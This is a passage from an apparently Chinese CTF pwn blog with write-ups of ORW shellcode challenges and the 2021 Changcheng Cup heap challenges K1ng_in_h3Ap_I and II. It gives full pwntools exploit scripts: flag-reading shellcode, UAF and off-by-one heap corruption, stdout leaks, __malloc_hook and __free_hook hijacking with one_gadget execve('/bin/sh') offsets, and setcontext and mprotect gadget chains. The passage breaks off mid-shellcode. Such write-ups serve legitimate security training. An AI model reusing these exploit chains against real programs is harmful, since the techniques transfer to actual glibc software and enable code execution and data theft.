<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;i386&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">27948</span>)<br><br>shellcode=asm(<span class="hljs-string">&#x27;push 0x0;push 0x67616c66;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax,0x5;int 0x80&#x27;</span>)<br>shellcode+=asm(<span class="hljs-string">&#x27;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x100;int 0x80&#x27;</span>)<br>shellcode+=asm(<span class="hljs-string">&#x27;mov eax,0x4;mov ebx,0x1;int 0x80&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;shellcode:&#x27;</span>,shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>exp2：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;i386&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">27948</span>)<br>shellcode=asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag&#x27;</span>)+shellcraft.read(<span class="hljs-string">&#x27;eax&#x27;</span>,<span class="hljs-string">&#x27;esp&#x27;</span>,<span class="hljs-number">0x30</span>)+shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;esp&#x27;</span>,<span class="hljs-number">0x30</span>))<br>p.sendlineafter(<span class="hljs-string">&#x27;shellcode:&#x27;</span>,shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure>



<h3 id="二、easy-shellcode"><a href="#二、easy-shellcode" class="headerlink" title="二、easy_shellcode"></a>二、easy_shellcode</h3><p>来自2021NEEPU 纳新CTF上的一道题</p>
<p><img src="/2021/09/21/2021-09-21-orw/QQ%E5%9B%BE%E7%89%8720210522123857.png"></p>
<p>64位，保护全开</p>
<p><img src="/2021/09/21/2021-09-21-orw/QQ%E5%9B%BE%E7%89%8720210522123942.png"></p>
<p><img src="/2021/09/21/2021-09-21-orw/QQ%E5%9B%BE%E7%89%8720210522130822.png"></p>
<p>跟上面很类似，也是有个直接输入点，然后调用执行输入的数据，借用shellcraft，把寄存器改为64位下的即可获取flag</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;neepusec.club&quot;</span>,<span class="hljs-number">18626</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>shellcode=asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag&#x27;</span>))<br>shellcode+=asm(shellcraft.read(<span class="hljs-string">&#x27;rax&#x27;</span>,<span class="hljs-string">&#x27;rsp&#x27;</span>,<span class="hljs-number">0x30</span>))<br>shellcode+=asm(shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;rsp&#x27;</span>,<span class="hljs-number">0x30</span>))<br>p.sendlineafter(<span class="hljs-string">&quot;orw&quot;</span>,shellcode)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>

<h2 id="堆上orw"><a href="#堆上orw" class="headerlink" title="堆上orw"></a>堆上orw</h2><p>前面呢，都是一些有关于orw思想的入门基础题，而比赛中常见的都是堆上的orw</p>
<h3 id="低版本"><a href="#低版本" class="headerlink" title="低版本"></a>低版本</h3><p>一般在 <code>Glibc2.29</code>以前的 <code>ORW</code>解题思路已经比较清晰，主要是劫持 <code>free_hook</code> 或者 <code>malloc_hook</code>写入 <code>setcontext+53</code>函数中的 gadget，通过 <code>rdi</code>索引，来设置相关寄存器，并执行提前布置好的 <code>ORW ROP chains</code></p>
<p>setcontext+53处的gadget如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">&lt;setcontext+53&gt;:  mov    rsp,QWORD PTR [rdi+0xa0]<br>&lt;setcontext+60&gt;:  mov    rbx,QWORD PTR [rdi+0x80]<br>&lt;setcontext+67&gt;:  mov    rbp,QWORD PTR [rdi+0x78]<br>&lt;setcontext+71&gt;:  mov    r12,QWORD PTR [rdi+0x48]<br>&lt;setcontext+75&gt;:  mov    r13,QWORD PTR [rdi+0x50]<br>&lt;setcontext+79&gt;:  mov    r14,QWORD PTR [rdi+0x58]<br>&lt;setcontext+83&gt;:  mov    r15,QWORD PTR [rdi+0x60]<br>&lt;setcontext+87&gt;:  mov    rcx,QWORD PTR [rdi+0xa8]<br>&lt;setcontext+94&gt;:  push   rcx<br>&lt;setcontext+95&gt;:  mov    rsi,QWORD PTR [rdi+0x70]<br>&lt;setcontext+99&gt;:  mov    rdx,QWORD PTR [rdi+0x88]<br>&lt;setcontext+106&gt;: mov    rcx,QWORD PTR [rdi+0x98]<br>&lt;setcontext+113&gt;: mov    r8,QWORD PTR [rdi+0x28]<br>&lt;setcontext+117&gt;: mov    r9,QWORD PTR [rdi+0x30]<br>&lt;setcontext+121&gt;: mov    rdi,QWORD PTR [rdi+0x68]<br>&lt;setcontext+125&gt;: xor    eax,eax<br>&lt;setcontext+127&gt;: ret<br></code></pre></td></tr></table></figure>

<p>目的是获得一个可执行的权限，需要注意的是<code>mov rsp, [rdi+0xa0]</code>和<code>mov rcx, [rdi+0xa8]</code>。修改rsp的值将会改变栈指针，因此我们就获得了控制栈的能力，修改rcx的值后接着有个push操作将rcx压栈，然后汇编指令按照顺序会执行代码中最后的ret操作，而ret去执行的地址就是压入栈的rcx值，因此修改rcx就获得了控制程序流程的能力</p>
<p>但是为了能执行到这，我们先要做的就是劫持 free_hook 为<code>setcontext + 53</code>的地址，跳转到这边来执行上面的gadgets，但这都不是重点，重点是<code>setcontext + 53</code>上的传参设置。因为都是借用rdi传参，刚好我们执行 free 释放堆块时，传入的第一个参数是堆的地址，是存在rdi上的，所以我们要释放的堆块的地址十分关键，在其偏移0xa0和0xa8的位置分别填上我们存储orw链内容的地址（注意不是orw的第一个指令地址）和一个ret汇编指令的地址</p>
<p>注：为什么不能直接是orw的地址：因为执行完setcontext + 53上的gadget会执行ret，而ret执行的rcx指向的地址，如果rcx装的是mprotect的地址，执行完mprotect就会去执行rsp指向的地址，注意是地址！如果前面直接传入rsp的是orw的第一个指令地址，那么ret执行的是把写在上面的指令作为一个地址解析，直接就会报错了，因为rip获取的是栈顶的值，所以要中转一下，前面写的是另外一个地址（一般就直接在shellcode前八个字节的地方），然后在这个地址上写入的才是shellcode的地址</p>
<p>可以自己算偏移，也可以借用pwntools的SigreturnFrame类直接来构造。此时frame中的rsp和rip对应的就是setcontext的rsp和rcx</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">context.arch</span> = <span class="hljs-string">&quot;amd64&quot;</span><br><span class="hljs-attr">frame</span> = SigreturnFrame()<br><span class="hljs-attr">frame.rsp</span> = shellcode_addr<br><span class="hljs-attr">frame.rip</span> = ret_addr<br></code></pre></td></tr></table></figure>

<p>例题查看我之前的比赛复现题目：<code>K1ng_in_h3Ap_II</code>，<code>Whats your name</code></p>
<h3 id="高版本"><a href="#高版本" class="headerlink" title="高版本"></a>高版本</h3><p>但在 <code>Glibc 2.29</code>之后 <code>setcontext</code>中的gadget变成了以 <code>rdx</code>索引，因此如果我们按照之前思路的话，还要先通过 <code>ROP</code>控制 <code>RDX</code>的值，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">.text:00000000000580DD                 mov     rsp, [rdx+0A0h]<br>.text:00000000000580E4                 mov     rbx, [rdx+80h]<br>.text:00000000000580EB                 mov     rbp, [rdx+78h]<br>.text:00000000000580EF                 mov     r12, [rdx+48h]<br>.text:00000000000580F3                 mov     r13, [rdx+50h]<br>.text:00000000000580F7                 mov     r14, [rdx+58h]<br>.text:00000000000580FB                 mov     r15, [rdx+60h]<br>.text:00000000000580FF                 test    dword ptr fs:48h, 2<br>    ....<br>.text:00000000000581C6                 mov     rcx, [rdx+0A8h]<br>.text:00000000000581CD                 push    rcx<br>.text:00000000000581CE                 mov     rsi, [rdx+70h]<br>.text:00000000000581D2                 mov     rdi, [rdx+68h]<br>.text:00000000000581D6                 mov     rcx, [rdx+98h]<br>.text:00000000000581DD                 mov     r8, [rdx+28h]<br>.text:00000000000581E1                 mov     r9, [rdx+30h]<br>.text:00000000000581E5                 mov     rdx, [rdx+88h]<br>.text:00000000000581EC                 xor     eax, eax<br>.text:00000000000581EE                 retn<br></code></pre></td></tr></table></figure>

<h3 id="gadget1"><a href="#gadget1" class="headerlink" title="gadget1"></a>gadget1</h3><p>这其中用到的 <code>gadget</code>是 <code>getkeyserv_handle+576</code>，其汇编如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">mov     rdx, [rdi+8]<br>mov     [rsp+0C8h+var_C8], rax<br>call    qword ptr [rdx+20h]<br></code></pre></td></tr></table></figure>

<p>这个 <code>gadget</code>可以通过 <code>rdi</code> 来控制 <code>rdx</code>， 非常好用，而且从 Glibc2.29到2.32都可用</p>
<p>控制 <code>rdx</code>之后，我们就可以通过 <code>setcontext</code>来控制其他寄存器了</p>
<h3 id="gadget2"><a href="#gadget2" class="headerlink" title="gadget2"></a>gadget2</h3><p>通过 gadget控制rbp的值，从而进行栈迁移，将栈劫持到我们可以控制的堆地址上，并执行预先布置的rop链，从而获取flag</p>
<p>先介绍一下万金油的gadget <code>svcudp_reply+26</code>，汇编如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">mov rbp, qword ptr [rdi + 0x48]; <br>mov rax, qword ptr [rbp + 0x18]; <br>lea r13, [rbp + 0x10]; <br>mov dword ptr [rbp + 0x10], 0; <br>mov rdi, r13; <br>call qword ptr [rax + 0x28];<br></code></pre></td></tr></table></figure>

<p>这个gadgets主要是通过 <code>rdi</code>控制 <code>rbp</code>进而控制 <code>rax</code>并执行跳转，由于我们已经控制了 <code>rbp</code>的值，因此只需要在 <code>rax+0x28</code>的位置部署 <code>leave；ret</code>即可完成栈迁移</p>
<p>从而在我们已经布置好 <code>orw rop链</code>的位置伪造栈地址并劫持控制流，最终读取<code>flag</code></p>
<h3 id="gadget3"><a href="#gadget3" class="headerlink" title="gadget3"></a>gadget3</h3><p>在gadget2中是通过gadgets进行栈迁移，将原本的栈地址劫持到了堆上，但如果栈地址已知的话，解题过程会更加简单，而且不需要特意去寻找gadgets，那么如何泄露栈地址呢？其实程序的栈地址会存放在 <code>environ</code>中，我们只要输出<code>environ</code>的内容就能获取栈地址</p>
<p>来源：<a href="https://www.anquanke.com/post/id/236832">https://www.anquanke.com/post/id/236832</a></p>
<p>​            <a href="http://blog.eonew.cn/archives/993">http://blog.eonew.cn/archives/993</a></p>
<p>​            <a href="https://blog.csdn.net/A951860555/article/details/118268484">https://blog.csdn.net/A951860555/article/details/118268484</a></p>
]]></content>
      <tags>
        <tag>orw</tag>
      </tags>
  </entry>
  <entry>
    <title>2021长城杯PWN</title>
    <url>/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这次一共三题pwn，两题其实都是比较常见的堆题，可惜只做出了一题，还有一题堆上的orw在比赛前没能出 。不过总的来说：比之前还是进步了很多，加油</p>
<h2 id="K1ng-in-h3Ap-I"><a href="#K1ng-in-h3Ap-I" class="headerlink" title="K1ng_in_h3Ap_I"></a>K1ng_in_h3Ap_I</h2><p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210921161053043.png"><span class="image-caption">image-20210921161053043</span></p>
<p>毫无疑问的64位，保护全开</p>
<p>程序一共有着三个功能以及一个好心送我们的三字节libc地址</p>
<p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210921161202941.png"><span class="image-caption">image-20210921161202941</span></p>
<p>输入666会打印出后三字节地址</p>
<p>申请堆块没有特殊的，只是不能申请大于0xF0的堆块</p>
<p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210921161426698.png"><span class="image-caption">image-20210921161426698</span></p>
<p>写入功能存在着offbyone，还要注意的就是交互要输入’\n’才能结束，否则就要输入完所有长度数据</p>
<p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210921161337239.png"><span class="image-caption">image-20210921161337239</span></p>
<p>释放功能存在UAF</p>
<p>所以我的思路是借着offbyone生成unsorted chunk，得到libc地址，然后再将他分为一块大小为为0x70的fast chunk，借用UAF对着libc后三位进行覆盖，覆盖成stdout的地址，将堆块分配到stdout上，吐出libc地址。然后故技重施，再分配到__malloc_hook上，但是还要借用relloc调整一下才行</p>
<p>看了别人的wp，对于第一次把chunk分配到stdout还有别的思路：先释放一块unsorted chunk，然后申请回来0x70大小的fast chunk，此时这块chunk上也是会残留着libc地址（正常的malloc是不会清零的），然后释放两个fast chunk进入bin链，将后进的那块，借用UAF把fd指针修改成指向有着libc地址的那个chunk，这时也能将堆块申请到stdout上</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx,size</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;input index:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;input size:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; \n&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;input index:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;input index:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;input context:&quot;</span>)<br>	p.sendline(content)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; \n&quot;</span>,<span class="hljs-string">&#x27;666&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>addr = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">6</span>),<span class="hljs-number">16</span>) <br>log.success(<span class="hljs-built_in">hex</span>(addr))<br>stdout = (addr + <span class="hljs-number">0x36FE10</span>) &amp; <span class="hljs-number">0xFFFFFF</span><br>log.info(<span class="hljs-string">&quot;stdout==&gt;0x%x&quot;</span> %stdout)<br>low = stdout &amp; <span class="hljs-number">0xFFFF</span><br>high = (stdout &gt;&gt; <span class="hljs-number">16</span>) &amp;<span class="hljs-number">0xFF</span><br>log.info(<span class="hljs-string">&quot;low==&gt;0x%x&quot;</span> %low)<br>log.info(<span class="hljs-string">&quot;high==&gt;0x%x&quot;</span> %high)<br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x28</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x68</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span> + <span class="hljs-string">&#x27;\xa1&#x27;</span>)<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x28</span>)<br>edit(<span class="hljs-number">2</span>,p16(low - <span class="hljs-number">0x43</span>) + p8(high))<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x68</span>)<br>payload = p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">6</span> + p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + <span class="hljs-string">&#x27;\x00&#x27;</span> <br>edit(<span class="hljs-number">4</span>,payload)<br>p.recv(<span class="hljs-number">0x40</span>)<br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3c5600</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>ogg = libc_base + <span class="hljs-number">0x4527a</span><br>mlh = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x28</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x28</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x68</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;input index:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span> + <span class="hljs-string">&#x27;\xa1&#x27;</span>)<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x28</span>)<br>edit(<span class="hljs-number">3</span>,p64(mlh - <span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x68</span>)<br>realloc = libc_base + libc.sym[<span class="hljs-string">&#x27;__libc_realloc&#x27;</span>]<br>log.info(<span class="hljs-string">&quot;__libc_realloc==&gt;0x%x&quot;</span> %realloc)<br>payload = p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0</span>) + p64(ogg) + p64(realloc+<span class="hljs-number">16</span>)<br>edit(<span class="hljs-number">5</span>,payload)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x20</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="K1ng-in-h3Ap-II"><a href="#K1ng-in-h3Ap-II" class="headerlink" title="K1ng_in_h3Ap_II"></a>K1ng_in_h3Ap_II</h2><p>来源：<a href="https://blog.csdn.net/eeeeeight/article/details/120386415">https://blog.csdn.net/eeeeeight/article/details/120386415</a></p>
<p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210921163803827.png"><span class="image-caption">image-20210921163803827</span></p>
<p>常规checksec，64位保护全开。在程序上跟上题是差不多的，少了666的地址泄露以及offbyone漏洞，但是多了打印功能，以及libc版本提升至2.27，至于2.27，就是标志性的tcache bin</p>
<p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922131449936.png"><span class="image-caption">image-20210922131449936</span></p>
<p>然后申请的size只能是在0x10~0x60</p>
<p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922132037509.png"><span class="image-caption">image-20210922132037509</span></p>
<p>UAF依然存在</p>
<p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922132136392.png"><span class="image-caption">image-20210922132136392</span></p>
<p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922132215898.png"><span class="image-caption">image-20210922132215898</span></p>
<p>多了一层沙箱，看到这个基本都是orw的思路：借用setcontext + 53上的gadgets，调用mprotect使得堆可执行，然后执行布置在堆上的rop链，读取flag</p>
<p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922132710147.png"><span class="image-caption">image-20210922132710147</span></p>
<p>申请0x50的堆块是因为链上没有0x60的空闲堆块，所以申请出来的堆块是在最底下的（与top chunk相近的）并且两块是连续的，好算偏移</p>
<p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922133019126.png"><span class="image-caption">image-20210922133019126</span></p>
<p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922133236908-16322992251781.png"><span class="image-caption">image-20210922133236908</span></p>
<p>然后先后释放，借用UAF泄露出堆上地址，进而计算tcache地址</p>
<p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922162651147.png"><span class="image-caption">image-20210922162651147</span></p>
<p>然后把我们之后要申请用到的堆块的count数量改为2，以及把unsorted chunk的count全部一次性改为7，为后续释放unsorted chunk进入bin链泄露libc基址做工作</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#修改tcache bin</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x50</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x50</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x20</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x60</span>)<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">1</span>)<br>leak_heap=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))<br>log.success(<span class="hljs-string">&#x27;leak heap: &#x27;</span>+<span class="hljs-built_in">hex</span>(leak_heap))<br>next_heap=leak_heap + <span class="hljs-number">0xc0</span><br>tc_addr=leak_heap - <span class="hljs-number">0xf60</span><br>log.success(<span class="hljs-string">&#x27;tc addr: &#x27;</span>+<span class="hljs-built_in">hex</span>(tc_addr))<br>free(<span class="hljs-number">3</span>)<br>edit(<span class="hljs-number">3</span>, p64(tc_addr))<br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">5</span>, <span class="hljs-number">0x60</span>)<br>payload = p64(<span class="hljs-number">0x200000002</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x0707070707070707</span>)*<span class="hljs-number">6</span><br></code></pre></td></tr></table></figure>

<p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922162838313.png"><span class="image-caption">image-20210922162838313</span></p>
<p>修改之前释放堆块的fd指针指向0x20堆块，而前面也修改了0x60堆块的count数量为2，所以可以申请，造成overlap，之后修改0x20堆块的size，申请0x30的堆块，（原因是这个大小的堆块是不存在空闲的堆块，所以可以全部相邻在一起，方便操作）。把底下的堆块都包含在内，记得要留一个防止与top chunk进行合并</p>
<p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922163245528.png"><span class="image-caption">image-20210922163245528</span></p>
<p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922163344836.png"><span class="image-caption">image-20210922163344836</span></p>
<p>然后释放得到libc地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#泄露libc基址</span><br>edit(<span class="hljs-number">5</span>, payload)<br>edit(<span class="hljs-number">1</span>, p64(next_heap))<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x50</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x50</span>)<br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span> + p64(<span class="hljs-number">0x141</span>)<br>edit(<span class="hljs-number">7</span>, payload)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3ebca0</span><br>log.success(<span class="hljs-string">&#x27;libc base: &#x27;</span>+ <span class="hljs-built_in">hex</span>(libc_base))<br></code></pre></td></tr></table></figure>

<p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922165259157.png"><span class="image-caption">image-20210922165259157</span></p>
<p>往free_hook里面写入setcontext+53的地址</p>
<p>然后根据<code>setcontext+53</code>上的寄存器布置环境：而rdi的值是我们等下要释放的堆块的地址，根据这个计算出偏移，在对应的地址为rdi，rsi，rdx设置参数，然后设置rcx的值为mprotect的地址，去执行mprotect，再跳转回来执行shellcode读取flag</p>
<p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922170913920.png"><span class="image-caption">image-20210922170913920</span></p>
<p>成功读取flag！</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">8</span>, <span class="hljs-number">0x50</span>)<br>add(<span class="hljs-number">9</span>, <span class="hljs-number">0x50</span>)<br>add(<span class="hljs-number">10</span>, <span class="hljs-number">0x50</span>) <br>add(<span class="hljs-number">11</span>, <span class="hljs-number">0x10</span>)<br>free(<span class="hljs-number">11</span>)<br>edit(<span class="hljs-number">11</span>, p64(free_hook))<br>add(<span class="hljs-number">11</span>, <span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">11</span>, <span class="hljs-number">0x10</span>) <span class="hljs-comment">#free_hook</span><br>edit(<span class="hljs-number">11</span>, p64(setcontext))<br>shellcode_addr = tc_addr + <span class="hljs-number">0x1110</span><br>shellcode = asm(<br>	<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rsi, 0x67616c662f2e</span><br><span class="hljs-string">    push rsi</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    mov rax, 2</span><br><span class="hljs-string">    xor rsi, rsi</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rdi, rax</span><br><span class="hljs-string">    xor rax, rax</span><br><span class="hljs-string">    mov rsi, 